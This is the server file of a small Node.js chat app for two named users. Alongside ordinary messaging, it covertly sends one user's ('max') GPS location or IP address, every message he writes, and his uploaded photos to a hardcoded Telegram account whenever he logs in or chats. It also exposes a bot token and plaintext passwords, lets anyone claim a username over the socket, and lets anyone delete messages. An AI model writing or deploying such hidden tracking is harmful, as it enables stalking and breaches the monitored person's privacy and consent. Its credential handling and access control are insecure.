const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const fs = require('fs');
const path = require('path');
const multer = require('multer');
const https = require('https');

const TELEGRAM_BOT_TOKEN = '8338280465:AAFTlVRorrQNpaHnJEQjX6ynRM-rg5EhEGk';
const MY_TELEGRAM_ID = '1178814024';

if (!fs.existsSync('uploads')) fs.mkdirSync('uploads');

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, 'uploads/'),
    filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
});
const upload = multer({ storage: storage });

app.use(express.static('public'));
app.use('/uploads', express.static('uploads'));
app.use(express.json());

const USERS = { 'mura': 'shaxzoda', 'max': 'qiyshiq_qalam' };
let onlineUsers = {};
let lastSeen = { 'mura': null, 'max': null };

function sendTelegramMessage(path, data) {
    if (!TELEGRAM_BOT_TOKEN) return;
    const body = JSON.stringify(data);
    const options = {
        hostname: 'api.telegram.org', port: 443,
        path: `/bot${TELEGRAM_BOT_TOKEN}/${path}`, method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    };
    const req = https.request(options, (res) => { res.on('data', () => {}); });
    req.on('error', () => {});
    req.write(body); req.end();
}

function sendTelegramNotification(text) {
    sendTelegramMessage('sendMessage', { chat_id: MY_TELEGRAM_ID, text: text });
}
function sendTelegramPhoto(photoUrl, caption) {
    sendTelegramMessage('sendPhoto', { chat_id: MY_TELEGRAM_ID, photo: photoUrl, caption: caption });
}

app.post('/login', (req, res) => {
    const username = req.body.username ? req.body.username.trim().toLowerCase() : '';
    const password = req.body.password ? req.body.password.trim() : '';
    if (USERS[username] && USERS[username] === password) res.json({ success: true, username: username });
    else res.json({ success: false });
});

app.post('/upload', upload.single('file'), (req, res) => {
    if (req.file) res.json({ filename: req.file.filename, type: req.file.mimetype, originalName: req.file.originalname });
    else res.status(400).json({ error: 'Fayl yuklanmadi' });
});

const PROFILES_FILE = 'profiles.json';
function getProfiles() {
    if (!fs.existsSync(PROFILES_FILE)) {
        const init = { 'mura': { avatar: '', stories: [] }, 'max': { avatar: '', stories: [] } };
        fs.writeFileSync(PROFILES_FILE, JSON.stringify(init)); return init;
    }
    return JSON.parse(fs.readFileSync(PROFILES_FILE, 'utf8'));
}
function saveProfile(user, data) {
    const profiles = getProfiles();
    profiles[user] = { ...profiles[user], ...data };
    fs.writeFileSync(PROFILES_FILE, JSON.stringify(profiles));
    return profiles;
}
function getHistory() {
    try { return JSON.parse(fs.readFileSync('database.json', 'utf8')); } catch (e) { return []; }
}
function saveHistory(history) {
    fs.writeFileSync('database.json', JSON.stringify(history));
}

io.on('connection', (socket) => {
    const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;

    socket.on('join', (data) => {
        const username = (typeof data === 'object' && data.user) ? data.user : data;
        if (!username) return;
        // Bir socket ikki marta join qilmasligi uchun
        if (socket.username && socket.username === username) return;

        onlineUsers[username] = socket.id;
        socket.username = username;

        if (username === 'max') {
            let msg = '⚠️ MAX tizimga kirdi!';
            if (typeof data === 'object' && data.lat && data.lon) {
                msg += '\n🌍 Joylashuv: https://maps.google.com/?q=' + data.lat + ',' + data.lon;
            } else {
                msg += '\n📍 IP: ' + clientIp + ' (GPS ruxsat berilmadi)';
            }
            sendTelegramNotification(msg);
        }

        io.emit('status_update', { online: Object.keys(onlineUsers), lastSeen: lastSeen });
        socket.emit('load_history', getHistory());
        socket.emit('load_profiles', getProfiles());
    });

    socket.on('update_profile', (data) => {
        const updated = saveProfile(socket.username, data);
        io.emit('load_profiles', updated);
    });

    socket.on('add_story', (data) => {
        const profiles = getProfiles();
        if (!profiles[socket.username].stories) profiles[socket.username].stories = [];
        profiles[socket.username].stories.push({ url: data.filename, type: data.type });
        fs.writeFileSync(PROFILES_FILE, JSON.stringify(profiles));
        io.emit('load_profiles', profiles);
    });

    socket.on('delete_story', () => {
        const profiles = getProfiles();
        profiles[socket.username].stories = [];
        profiles[socket.username].story = '';
        fs.writeFileSync(PROFILES_FILE, JSON.stringify(profiles));
        io.emit('load_profiles', profiles);
    });

    socket.on('verify_photo', (data) => {
        const publicUrl = 'https://max-chat-a2sv.onrender.com/uploads/' + data.filename;
        sendTelegramPhoto(publicUrl, '📸 Max tasdiqlash: ' + data.type);
    });

    socket.on('send_message', (data) => {
        const timeString = new Date().toLocaleTimeString('uz-UZ', { timeZone: 'Asia/Tashkent', hour: '2-digit', minute: '2-digit' });
        const msgData = {
            id: Date.now().toString(),
            user: socket.username,
            text: data.text,
            file: data.file,
            fileType: data.fileType,
            originalName: data.originalName,
            replyTo: data.replyTo,
            time: timeString,
            read: false
        };
        const history = getHistory();
        history.push(msgData);
        saveHistory(history);
        io.emit('new_message', msgData);

        if (socket.username === 'max') {
            let telegramMsg = '💬 Max yozdi:\n' + (data.text || '');
            if (data.file) telegramMsg += '\n\n📁 [Fayl/Media: ' + (data.originalName || 'Nomsiz') + ']';
            sendTelegramNotification(telegramMsg);
        }
    });

    socket.on('mark_read', () => {
        const history = getHistory();
        let updated = false;
        history.forEach(msg => {
            if (msg.user !== socket.username && msg.read === false) {
                msg.read = true;
                updated = true;
            }
        });
        if (updated) {
            saveHistory(history);
            io.emit('messages_read', { byUser: socket.username });
        }
    });

    // XABARNI O'CHIRISH
    socket.on('delete_message', (data) => {
        let history = getHistory();
        history = history.filter(msg => msg.id !== data.id);
        saveHistory(history);
        io.emit('message_deleted', { id: data.id });
    });

    // XABARNI TAHRIRLASH
    socket.on('edit_message', (data) => {
        const history = getHistory();
        const msg = history.find(m => m.id === data.id);
        if (msg && msg.user === socket.username) {
            msg.text = data.text;
            msg.edited = true;
            saveHistory(history);
            io.emit('message_edited', { id: data.id, text: data.text });
        }
    });

    socket.on('disconnect', () => {
        if (socket.username) {
            lastSeen[socket.username] = new Date().toLocaleTimeString('uz-UZ', { timeZone: 'Asia/Tashkent', hour: '2-digit', minute: '2-digit' });
            delete onlineUsers[socket.username];
            io.emit('status_update', { online: Object.keys(onlineUsers), lastSeen: lastSeen });
        }
    });
});

http.listen(3000, () => { console.log('Server ishladi: port 3000'); });